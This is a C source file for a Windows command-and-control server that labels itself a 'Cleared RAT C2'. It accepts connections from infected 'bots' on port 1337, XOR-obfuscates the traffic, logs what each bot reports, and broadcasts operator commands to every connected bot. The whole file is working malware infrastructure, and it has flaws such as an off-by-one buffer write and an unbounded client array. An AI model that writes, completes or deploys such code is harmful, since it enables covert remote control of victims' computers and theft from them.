#include <winsock2.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#pragma comment(lib,"ws2_32.lib")

#define PORT 1337
#define MAXC 64
SOCKET clients[MAXC];
int nclients = 0;

void xor_buf(char *d, int len){
    const char *k="cleared"; int kl=strlen(k);
    for(int i=0;i<len;i++) d[i]^=k[i%kl];
}

int send_pkt(SOCKET s, const char *data, int len){
    uint32_t n=htonl(len);
    send(s,(char*)&n,4,0);
    char *c=malloc(len); memcpy(c,data,len); xor_buf(c,len);
    send(s,c,len,0); free(c); return 1;
}

int recv_pkt(SOCKET s, char *buf, int sz){
    uint32_t n; if(recv(s,(char*)&n,4,0)<=0) return -1;
    n=ntohl(n); if(n>sz) n=sz;
    if(recv(s,buf,n,0)<=0) return -1;
    xor_buf(buf,n); buf[n]=0; return n;
}

DWORD WINAPI handler(LPVOID p){
    SOCKET s=(SOCKET)p;
    char buf[65536];
    int n=recv_pkt(s,buf,sizeof(buf));
    if(n>0) printf("[+] Bot joined:\n%s\n", buf);
    while(1){
        n=recv_pkt(s,buf,sizeof(buf));
        if(n<=0) break;
        printf("\n[%d] %s\n", (int)s, buf);
    }
    closesocket(s);
    printf("[-] Bot %d left\n",(int)s);
    return 0;
}

int main(){
    WSADATA w; WSAStartup(MAKEWORD(2,2),&w);
    SOCKET srv=socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in a={0};
    a.sin_family=AF_INET; a.sin_port=htons(PORT);
    a.sin_addr.s_addr=INADDR_ANY;
    bind(srv,(struct sockaddr*)&a,sizeof(a));
    listen(srv,10);
    printf("[*] Cleared RAT C2 listening on :%d\n", PORT);

    int next_id = 0;
    while(1){
        SOCKET c=accept(srv,NULL,NULL);
        if(c==INVALID_SOCKET) continue;
        clients[next_id++] = c;
        printf("[+] Bot #%d connected\n", next_id-1);
        CreateThread(NULL,0,handler,(LPVOID)c,0,NULL);

        /* simple command prompt */
        char line[512];
        printf("cmd> "); fflush(stdout);
        if(fgets(line,sizeof(line),stdin)){
            line[strcspn(line,"\r\n")]=0;
            if(strlen(line)>0){
                for(int i=0;i<next_id;i++){
                    if(clients[i]!=INVALID_SOCKET)
                        send_pkt(clients[i], line, strlen(line));
                }
            }
        }
    }
    return 0;
}
